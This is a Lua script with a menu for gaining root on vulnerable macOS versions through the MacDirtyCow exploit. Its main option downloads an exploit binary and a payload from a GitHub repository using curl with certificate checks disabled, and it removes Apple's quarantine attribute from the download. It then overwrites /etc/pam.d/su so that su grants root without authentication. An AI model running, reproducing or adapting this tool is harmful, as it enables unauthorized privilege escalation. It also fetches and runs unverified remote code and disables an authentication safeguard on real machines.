#!/usr/bin/env lua

-- pre-functions
print("Defining preliminary functions")
function os.capture(cmd, raw)
    local f = assert(io.popen(cmd, 'r'))
    local s = assert(f:read('*a'))
    f:close()
    if raw then return s end
    s = string.gsub(s, '^%s+', '')
    s = string.gsub(s, '%s+$', '')
    s = string.gsub(s, '[\n\r]+', ' ')
    return s
  end
function os.sleep(n)
  local t = os.clock()
  io.write("\n")
  io.write("\27[A")
  while os.clock() - t < n do end
end
print("Defining variables and running preperation functions")
-- variables // do not touch
local http = require("socket.http")
local homedir = os.getenv("HOME")
local osVersion = os.capture("sw_vers -productVersion")
local osBuildVer = os.capture("sw_vers -buildVersion")
local scriptVersion = "v0.0.1"
local date = os.date()
local isAdmin = os.capture("id -u")
isAdmin = tonumber(isAdmin) == 0 and "yes" or "no"
if isAdmin then
  print("\n\n>>If the script errors out here, make sure to run with sudo -E /path/to/script<<\n\n\n")
end
local tempdir = os.getenv("TMPDIR")
if io.open(tempdir.."fs/", "r") then
  os.execute("rm -rf $TMPDIR/fs/")
end
os.execute("mkdir $TMPDIR/fs/")
-- function table
print("Creating function table")
local functionTable = {
  e = function()
    io.write("\27c")
    print("Exiting script...")
    os.sleep(3)
    io.write("\27c")
    os.exit()
  end,
  s = function()
    io.write("\27c")
    io.write("Are you sure you want to shutdown? yes/no: ")
    local r = io.read()
    if tostring(r) == "yes" and isAdmin == "yes" then
      os.execute("shutdown -h NOW")
    elseif tostring(r) == "yes" and isAdmin == "no" then
      os.execute('osascript -e \'tell application "Finder"\n\tshut down\nend tell\'')
    else
      welcomeScreen()
    end
  end,
  ["1"] = function()
    io.write("\27c")
    print("Checking if macOS is exploitable...")
    local incompatibleVersions = {
      ["12.6.2"] = true,
      ["12.6.3"] = true,
      ["12.6.4"] = true,
      ["12.6.5"] = true,
      ["12.6.6"] = true,
      ["13.1"] = true,
      ["13.2"] = true,
      ["13.2.1"] = true,
      ["13.3"] = true,
      ["13.3.1"] = true,
      ["13.4"] = true,
      ["13.5"] = true,
    }
    if incompatibleVersions[osVersion] then
      print("\nYour macOS is NOT exploitable by MacDirtyCow, and therefore, this function is obsolete.")
      print("\nYou may continue, but the exploit will not work.")
      io.write("Press c and enter to continue, or any key and enter to exit: ")
      local r = io.read()
      if r ~= "c" then
        welcomeScreen()
      else
      end
    else
      print("\nYour macOS is exploitable by MacDirtyCow, continuing...")
    end
    io.write("\27c")
    io.write("--> Download switcharoo")
    os.sleep(2)
    os.execute("curl -k https://raw.githubusercontent.com/Thyssenkrupp234/ra1nm8/main/resources/exploit/switcharoo > "..tempdir.."fs/switcharoo 2>/dev/null")
    io.write("\n--> Removing quarantine and making switcharoo executable")
    os.execute("chmod +x "..tempdir.."fs/switcharoo && xattr -rd com.apple.quarantine "..tempdir.."fs/switcharoo")
    os.sleep(1)
    io.write("\n--> Download overwrite_file.bin")
    os.sleep(2)
    os.execute("curl -k https://raw.githubusercontent.com/Thyssenkrupp234/ra1nm8/main/resources/exploit/overwrite_file.bin > "..tempdir.."fs/overwrite_file.bin 2>/dev/null")
    io.write("\nDownloaded items, executing command...\n\n")
    os.sleep(1)
    local exploitRun = os.capture(tempdir.."fs/switcharoo /etc/pam.d/su "..tempdir.."fs/overwrite_file.bin")
    io.write("\27c")
    io.write("Exploit ran. To check it it worked, run su in terminal.")
    io.read()
    welcomeScreen()
  end
}
print("Defining welcomescreen() function")
function welcomeScreen()
  -- clear screen then print out welcome stuff
  io.write("\27c")
  io.write("\27[96mmacOS: \27[92m"..osVersion.." ("..osBuildVer..")".."\n\27[96mScript Version: \27[92m"..scriptVersion.."\n\27[96mDate: \27[92m"..date.."\n\27[96mRunning as admin: \27[92m"..tostring(isAdmin))
  io.write("\n\27[0m\n\nE. Exit\nS. Shut Down\n1. Gain admin via MacDirtyCow\n\nPick an option: ")
  local response = io.read()
  if functionTable[string.lower(tostring(response))] then
    functionTable[string.lower(tostring(response))]()
  else
    welcomeScreen()
  end
end
print("Starting welcomescreen() function")
welcomeScreen()